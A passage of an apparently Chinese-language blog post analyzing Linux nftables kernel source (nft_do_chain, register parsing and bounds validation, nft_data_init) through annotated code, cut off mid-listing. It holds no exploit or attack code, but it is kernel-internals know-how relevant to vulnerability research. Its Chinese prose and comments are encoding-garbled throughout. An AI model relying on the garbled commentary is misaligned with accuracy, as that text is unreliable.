class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span><br><span class="hljs-title function_">nft_do_chain</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> nft_pktinfo *pkt, <span class="hljs-type">void</span> *priv)</span><br>&#123;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_chain</span> *<span class="hljs-title">chain</span> =</span> priv, *basechain = chain;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_rule_dp</span> *<span class="hljs-title">rule</span>, *<span class="hljs-title">last_rule</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net</span> *<span class="hljs-title">net</span> =</span> nft_net(pkt);<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_expr</span> *<span class="hljs-title">expr</span>, *<span class="hljs-title">last</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_regs</span> <span class="hljs-title">regs</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> stackptr = <span class="hljs-number">0</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_jumpstack</span> <span class="hljs-title">jumpstack</span>[<span class="hljs-title">NFT_JUMP_STACK_SIZE</span>];</span><br><span class="hljs-type">bool</span> genbit = READ_ONCE(net-&gt;nft.gencursor);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_rule_blob</span> *<span class="hljs-title">blob</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_traceinfo</span> <span class="hljs-title">info</span>;</span><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 1. è·å–rule</span><br><span class="hljs-comment">     */</span><br>info.trace = <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">if</span> (static_branch_unlikely(&amp;nft_trace_enabled))<br>nft_trace_init(&amp;info, pkt, &amp;regs.verdict, basechain);<br>do_chain:<br><span class="hljs-keyword">if</span> (genbit)<br>blob = rcu_dereference(chain-&gt;blob_gen_1);<br><span class="hljs-keyword">else</span><br>blob = rcu_dereference(chain-&gt;blob_gen_0);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 2. éå†ruleä¸­çš„æ‰€æœ‰exprå¹¶æ‰§è¡Œ</span><br><span class="hljs-comment">     */</span><br>rule = (<span class="hljs-keyword">struct</span> nft_rule_dp *)blob-&gt;data;<br>last_rule = (<span class="hljs-type">void</span> *)blob-&gt;data + blob-&gt;size;<br>next_rule:<br>regs.verdict.code = NFT_CONTINUE;<br><span class="hljs-keyword">for</span> (; rule &lt; last_rule; rule = nft_rule_next(rule)) &#123;<br>nft_rule_dp_for_each_expr(expr, last, rule) &#123;<br><span class="hljs-keyword">if</span> (expr-&gt;ops == &amp;nft_cmp_fast_ops)<br>nft_cmp_fast_eval(expr, &amp;regs);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (expr-&gt;ops == &amp;nft_bitwise_fast_ops)<br>nft_bitwise_fast_eval(expr, &amp;regs);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (expr-&gt;ops != &amp;nft_payload_fast_ops ||<br> !nft_payload_fast_eval(expr, &amp;regs, pkt))<br>expr_call_ops_eval(expr, &amp;regs, pkt);<br><br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">             * 3. å¦‚æœæ²¡æœ‰è®¾ç½®verdictåˆ™ç»§ç»­æ‰§è¡Œ</span><br><span class="hljs-comment">             */</span><br><span class="hljs-keyword">if</span> (regs.verdict.code != NFT_CONTINUE)<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * 4. ä¸€æ¡ruleæ‰§è¡Œå®Œæˆæˆ–è€…ä¸­é€”å‘ç”Ÿè·³è½¬ï¼Œè¿›è¡Œåˆ¤å†³</span><br><span class="hljs-comment">         */</span><br><span class="hljs-keyword">switch</span> (regs.verdict.code) &#123;<br><span class="hljs-keyword">case</span> NFT_BREAK:<span class="hljs-comment">// ruleä¸­é€”è®¾ç½®äº†breakï¼Œç»§ç»­æ‰§è¡Œä¸‹ä¸€æ¡rule</span><br>regs.verdict.code = NFT_CONTINUE;<br><span class="hljs-keyword">continue</span>;<br><span class="hljs-keyword">case</span> NFT_CONTINUE:<span class="hljs-comment">// ä¸€æ¡ruleæ‰§è¡Œå®Œï¼Œç»§ç»­æ‰§è¡Œä¸‹ä¸€æ¡rule</span><br>nft_trace_packet(&amp;info, chain, rule,<br> NFT_TRACETYPE_RULE);<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><span class="hljs-keyword">break</span>;<span class="hljs-comment">// å¦åˆ™æ‰§è¡Œå®Œæˆï¼Œè¿›è¡Œåˆ¤å†³</span><br>&#125;<br><br>nft_trace_verdict(&amp;info, chain, rule, &amp;regs);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 5. æ²¡æœ‰è·³è½¬ï¼Œè¿”å›é“¾æœ€ç»ˆåˆ¤å†³ç»“æœ</span><br><span class="hljs-comment">     */</span><br><span class="hljs-keyword">switch</span> (regs.verdict.code &amp; NF_VERDICT_MASK) &#123;<br><span class="hljs-keyword">case</span> NF_ACCEPT:<br><span class="hljs-keyword">case</span> NF_DROP:<br><span class="hljs-keyword">case</span> NF_QUEUE:<br><span class="hljs-keyword">case</span> NF_STOLEN:<br><span class="hljs-keyword">return</span> regs.verdict.code;<br>&#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 6. å­˜åœ¨è·³è½¬ï¼Œå¤„ç†è·³è½¬</span><br><span class="hljs-comment">     */</span><br><span class="hljs-keyword">switch</span> (regs.verdict.code) &#123;<br><span class="hljs-keyword">case</span> NFT_JUMP:<span class="hljs-comment">// jumpï¼šå…¥æ ˆè¿”å›åœ°å€</span><br><span class="hljs-keyword">if</span> (WARN_ON_ONCE(stackptr &gt;= NFT_JUMP_STACK_SIZE))<br><span class="hljs-keyword">return</span> NF_DROP;<br>jumpstack[stackptr].chain = chain;<br>jumpstack[stackptr].rule = nft_rule_next(rule);<br>jumpstack[stackptr].last_rule = last_rule;<br>stackptr++;<br>fallthrough;<br><span class="hljs-keyword">case</span> NFT_GOTO:<span class="hljs-comment">// gotoï¼šç›´æ¥è·³è½¬</span><br>chain = regs.verdict.chain;<br><span class="hljs-keyword">goto</span> do_chain;<br><span class="hljs-keyword">case</span> NFT_CONTINUE:<span class="hljs-comment">// å…¶ä»–ç‰¹æ®Šå¤„ç†</span><br><span class="hljs-keyword">case</span> NFT_RETURN:<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>WARN_ON_ONCE(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (stackptr &gt; <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">// returnï¼šå‡ºæ ˆè¿”å›åœ°å€</span><br>stackptr--;<br>chain = jumpstack[stackptr].chain;<br>rule = jumpstack[stackptr].rule;<br>last_rule = jumpstack[stackptr].last_rule;<br><span class="hljs-keyword">goto</span> next_rule;<br>&#125;<br><br>nft_trace_packet(&amp;info, basechain, <span class="hljs-literal">NULL</span>, NFT_TRACETYPE_POLICY);<br><br><span class="hljs-keyword">if</span> (static_branch_unlikely(&amp;nft_counters_enabled))<br>nft_update_chain_stats(basechain, pkt);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 7. å¦‚æœæ²¡æœ‰åˆ°è¾¾æ˜ç¡®çš„verdictï¼Œè¿”å›chainçš„policyï¼ˆé»˜è®¤ä¸ºacceptæˆ–dropï¼‰ </span><br><span class="hljs-comment">     */</span><br><span class="hljs-keyword">return</span> nft_base_chain(basechain)-&gt;policy;<br>&#125;<br>EXPORT_SYMBOL_GPL(nft_do_chain);<br></code></pre></td></tr></table></figure><h3 id="nftables-expression"><a href="#nftables-expression" class="headerlink" title="nftables expression"></a>nftables expression</h3><h4 id="é€šç”¨å‡½æ•°"><a href="#é€šç”¨å‡½æ•°" class="headerlink" title="é€šç”¨å‡½æ•°"></a>é€šç”¨å‡½æ•°</h4><p>æ¯ä¸ªexpressionéƒ½ä¼šæœ‰ä¸€ä¸ªinitå‡½æ•°å’Œä¸€ä¸ªevalå‡½æ•°</p><ul><li>initå‡½æ•°è´Ÿè´£åˆå§‹åŒ–å¯¹åº”exprç»“æ„ä½“</li><li>evalå‡½æ•°è´Ÿè´£æ‰§è¡Œå¯¹åº”çš„åŠ¨ä½œï¼Œæ¯”å¦‚å‘æŸä¸ªå¯„å­˜å™¨å†™å…¥æ•°æ®</li></ul><h5 id="nft-regså†…å­˜å¸ƒå±€"><a href="#nft-regså†…å­˜å¸ƒå±€" class="headerlink" title="nft_regså†…å­˜å¸ƒå±€"></a>nft_regså†…å­˜å¸ƒå±€</h5><img src="/2024/02/08/nft%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/regs.png" class title="regs"><ul><li>nftablesæœ€å¼€å§‹ä½¿ç”¨ <strong>16bytes verdict</strong> + <strong>4</strong> x <strong>16bytes data reg</strong></li><li>åæ¥ä½¿ç”¨ <strong>16bytes verdict</strong> + <strong>16</strong> x <strong>4bytes data reg</strong></li></ul><p>ä½¿ç”¨ <strong>nft_parse_register</strong> è·å–å¯„å­˜å™¨ä¸‹æ ‡</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">nft_parse_register</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nlattr *attr)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> reg;<br><br>reg = ntohl(nla_get_be32(attr));<br><span class="hljs-keyword">switch</span> (reg) &#123;<br><span class="hljs-keyword">case</span> NFT_REG_VERDICT...NFT_REG_4:<br><span class="hljs-keyword">return</span> reg * NFT_REG_SIZE / NFT_REG32_SIZE;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> reg + NFT_REG_SIZE / NFT_REG32_SIZE - NFT_REG32_00;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p><strong>NFT_REG</strong> ä½¿ç”¨16bytes data reg</p><ul><li><p>æšä¸¾ä»0å¼€å§‹</p></li><li><p>4ä¸ªu32è¡¨ç¤ºä¸€ä¸ªreg</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_regs</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>u32data[NFT_REG32_NUM];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_verdict</span><span class="hljs-title">verdict</span>;</span><br>&#125;;<br>&#125;;<br></code></pre></td></tr></table></figure></li></ul><p>æ‰€ä»¥ä¹˜å››å°±è¡Œ</p></li><li><p><strong>NFT_REG32</strong> ä½¿ç”¨4bytes data reg</p><ul><li>æšä¸¾ä»8å¼€å§‹</li><li>ä¸€ä¸ªu32è¡¨ç¤ºä¸€ä¸ªreg</li><li>ç¬¬ä¸€ä¸ªverdictå 16bytesï¼Œ4ä¸ªu32</li></ul><p>æ‰€ä»¥å‡æšä¸¾åŸºæ•°å†åŠ verdictå çš„ç©ºé—´</p></li></ul><h5 id="nft-parse-register-xxx"><a href="#nft-parse-register-xxx" class="headerlink" title="nft_parse_register_xxx"></a>nft_parse_register_xxx</h5><ul><li><p><strong>nft_parse_register_load</strong>ï¼šè§£ææºå¯„å­˜å™¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">nft_parse_register_load</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nlattr *attr, u8 *sreg, u32 len)</span><br>&#123;<br>u32 reg;<br><span class="hljs-type">int</span> err;<br><br>reg = nft_parse_register(attr);<br>err = nft_validate_register_load(reg, len);<br><span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> err;<br><br>*sreg = reg;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>EXPORT_SYMBOL_GPL(nft_parse_register_load);<br></code></pre></td></tr></table></figure><ul><li><p><strong>nft_parse_register</strong> è·å–index</p></li><li><p><strong>nft_validate_register_load</strong> æ£€éªŒindexåˆæ³•æ€§</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">nft_validate_register_load</span><span class="hljs-params">(<span class="hljs-keyword">enum</span> nft_registers reg, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> len)</span><br>&#123;<br><span class="hljs-keyword">if</span> (reg &lt; NFT_REG_1 * NFT_REG_SIZE / NFT_REG32_SIZE)<br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">if</span> (len == <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">if</span> (reg * NFT_REG32_SIZE + len &gt; sizeof_field(<span class="hljs-keyword">struct</span> nft_regs, data))<br><span class="hljs-keyword">return</span> -ERANGE;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>æºå¯„å­˜å™¨ä¸èƒ½æ˜¯verdict</li><li>è¯»å–é•¿åº¦ä¸èƒ½ä¸º0</li><li>è¯»å–èŒƒå›´ä¸èƒ½è¶…å‡ºnft_regsç»“æ„ä½“</li></ul></li><li><p>å°†indexèµ‹å€¼ç»™expr</p></li></ul></li><li><p><strong>nft_parse_register_store</strong>ï¼šè§£æç›®æ ‡å¯„å­˜å™¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">nft_parse_register_store</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nft_ctx *ctx,</span><br><span class="hljs-params">     <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nlattr *attr, u8 *dreg,</span><br><span class="hljs-params">     <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nft_data *data,</span><br><span class="hljs-params">     <span class="hljs-keyword">enum</span> nft_data_types type, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> len)</span><br>&#123;<br><span class="hljs-type">int</span> err;<br>u32 reg;<br><br>reg = nft_parse_register(attr);<br>err = nft_validate_register_store(ctx, reg, data, type, len);<br><span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> err;<br><br>*dreg = reg;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>EXPORT_SYMBOL_GPL(nft_parse_register_store);<br></code></pre></td></tr></table></figure><p>åŒä¸ŠğŸ‘†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">nft_validate_register_store</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nft_ctx *ctx,</span><br><span class="hljs-params">       <span class="hljs-keyword">enum</span> nft_registers reg,</span><br><span class="hljs-params">       <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nft_data *data,</span><br><span class="hljs-params">       <span class="hljs-keyword">enum</span> nft_data_types type,</span><br><span class="hljs-params">       <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> len)</span><br>&#123;<br><span class="hljs-type">int</span> err;<br><br><span class="hljs-keyword">switch</span> (reg) &#123;<br><span class="hljs-keyword">case</span> NFT_REG_VERDICT:<br><span class="hljs-keyword">if</span> (type != NFT_DATA_VERDICT)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br><span class="hljs-keyword">if</span> (data != <span class="hljs-literal">NULL</span> &amp;&amp;<br>    (data-&gt;verdict.code == NFT_GOTO ||<br>     data-&gt;verdict.code == NFT_JUMP)) &#123;<br>err = nf_tables_check_loops(ctx, data-&gt;verdict.chain);<br><span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> err;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">if</span> (reg &lt; NFT_REG_1 * NFT_REG_SIZE / NFT_REG32_SIZE)<br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">if</span> (len == <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">if</span> (reg * NFT_REG32_SIZE + len &gt;<br>    sizeof_field(<span class="hljs-keyword">struct</span> nft_regs, data))<br><span class="hljs-keyword">return</span> -ERANGE;<br><br><span class="hljs-keyword">if</span> (data != <span class="hljs-literal">NULL</span> &amp;&amp; type != NFT_DATA_VALUE)<br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>ç›®çš„å¯„å­˜å™¨ä¸ºverdict<ul><li>typeè¦åŒ¹é…</li><li>å†™å…¥codeä¸ºä¸¤ä¸ªè·³è½¬æŒ‡ä»¤æ—¶éœ€è¦è°ƒç”¨ <strong>nf_tables_check_loops</strong> åˆ¤æ–­æ˜¯å¦äº§ç”Ÿäº†å¾ªç¯</li></ul></li><li>indexä¸èƒ½è½åœ¨verdictçš„èŒƒå›´é‡Œ</li></ul></li></ul><h5 id="nft-data-init"><a href="#nft-data-init" class="headerlink" title="nft_data_init"></a>nft_data_init</h5><p>è¿™ä¸ªå‡½æ•°ç”¨äºè§£ædataï¼Œåˆå§‹åŒ–nft_dataç»“æ„ä½“ï¼Œç”¨äºè¡¨ç¤ºå¸¸é‡æˆ–è€…verdict</p><ul><li>ctxï¼šexpressionä¸Šä¸‹æ–‡</li><li>dataï¼šå¾…åˆå§‹åŒ–çš„dataç»“æ„ä½“</li><li>sizeï¼šdataçš„æœ€å¤§é•¿åº¦é™åˆ¶</li><li>descï¼šdataçš„æè¿°ç»“æ„ä½“</li><li>nlaï¼šå¾…è§£æçš„data</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">nft_data_init</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nft_ctx *ctx,</span><br><span class="hljs-params">  <span class="hljs-keyword">struct</span> nft_data *data, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size,</span><br><span class="hljs-params">  <span class="hljs-keyword">struct</span> nft_data_desc *desc, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nlattr *nla)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nlattr</span> *<span class="hljs-title">tb</span>[<span class="hljs-title">NFTA_DATA_MAX</span> + 1];</span><br><span class="hljs-type">int</span> err;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 1. è§£ænlaä¸­çš„dataï¼Œå¹¶å°†å„ä¸ªéƒ¨åˆ†æŒ‡é’ˆæ”¾è¿›æŒ‡é’ˆæ•°ç»„tb</span><br><span class="hljs-comment">     */</span><br>err = nla_parse_nested_deprecated(tb, NFTA_DATA_MAX, nla,<br>  nft_data_policy, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> err;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 2. æ•°æ®ç±»å‹æ˜¯æ™®é€šçš„dataï¼Œåˆå§‹åŒ–nft_dataç»“æ„ä½“</span><br><span class="hljs-comment">     */</span><br><span class="hljs-keyword">if</span> (tb[NFTA_DATA_VALUE])<br><span class="hljs-keyword">return</span> nft_value_init(ctx, data, size, desc,<br>      tb[NFTA_DATA_VALUE]);<br>    <br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 3. æ•°æ®ç±»å‹æ˜¯verdictï¼Œåˆå§‹åŒ–verdictç»“æ„ä½“</span><br><span class="hljs-comment">     */</span><br><span class="hljs-keyword">if</span> (tb[NFTA_DATA_VERDICT] &amp;&amp; ctx != <span class="hljs-literal">NULL</span>)<br><span class="hljs-keyword">return</span> nft_verdict_init(ctx, data, desc, tb[NFTA_DATA_VERDICT]);<br><span class="hljs-keyword">return</span> -EINVAL;<br>&#125;<br>EXPORT_SYMBOL_GPL(nft_data_init);<br></code></pre></td></tr></table></figure><ul><li><p><strong>nft_value_init</strong> æ•°æ®å¤åˆ¶ï¼Œé•¿åº¦ä¸èƒ½è¶…è¿‡sizeçš„é™åˆ¶</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_data</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>u32data[<span class="hljs-number">4</span>];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_verdict</span><span class="hljs-title">verdict</span>;</span><br>&#125;;<br>&#125; __attribute__((aligned(__alignof__(u64))));<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">nft_value_init</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nft_ctx *ctx,</span><br><span class="hljs-params">  <span class="hljs-keyword">struct</span> nft_data *data, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size,</span><br><span class="hljs-params">  <span class="hljs-keyword">struct</span> nft_data_desc *desc, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nlattr *nla)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> len;<br><br>len = nla_len(nla);<br><span class="hljs-keyword">if</span> (len == <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">if</span> (len &gt; size)<br><span class="hljs-keyword">return</span> -EOVERFLOW;<br><br>nla_memcpy(data-&gt;data, nla, len);<br>desc-&gt;type = NFT_DATA_VALUE;<br>desc-&gt;len  = len;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>nft_verdict_init</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_verdict</span> &#123;</span><br>u32code;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_chain</span>*<span class="hljs-title">chain</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span 